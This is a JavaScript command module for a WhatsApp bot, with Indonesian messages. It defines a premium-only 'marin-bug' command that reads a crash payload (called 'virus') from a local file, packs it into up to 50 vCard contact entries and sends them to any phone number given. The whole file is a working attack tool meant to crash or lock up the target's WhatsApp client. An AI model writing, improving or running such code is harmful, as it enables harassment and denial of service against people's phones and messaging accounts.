const fs = require('fs');
const path = require('path');

module.exports = {
    command: 'marin-bug',
    execute: async (sock, m, { args, reply, isPremium }) => {
        if (!isPremium) return reply("Fitur ini khusus untuk member premium (murbug). Silakan hubungi owner.");
        
        const nomor = args[0];
        const jumlah = parseInt(args[1]) || 5;
        const BAHAN_FILE = './bahan.txt';

        if (!nomor) return reply("Penggunaan: .marin-bug [nomor] [jumlah]\nContoh: .marin-bug 6281234567890 10");
        if (jumlah > 50) return reply("Maksimal 50 vcard sekali kirim.");

        const target = nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

        try {
            if (!fs.existsSync(BAHAN_FILE)) return reply("File payload bahan.txt tidak ditemukan.");
            
            const virus = fs.readFileSync(BAHAN_FILE, 'utf-8');
            const vcardBase = 'BEGIN:VCARD\nVERSION:3.0\nFN:';
            const vcardEnd = '\nTEL;type=CELL;type=VOICE;waid=6285726013874:6285726013874\nEND:VCARD';
            const payload = vcardBase + virus + vcardEnd;

            const listVcard = Array.from({ length: jumlah }, () => ({ vcard: payload }));

            await reply(`Mengirim ${jumlah} vcard bug ke ${target}...`);

            await sock.sendMessage(target, {
                contacts: {
                    displayName: '⿻ 𝐌𝐚𝐫𝐢𝐧 𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫',
                    contacts: listVcard
                }
            }, { quoted: m });

            reply(`Berhasil mengirim bug ke ${target}`);
        } catch (err) {
            reply("Gagal mengirim bug: " + err.message);
        }
    }
};
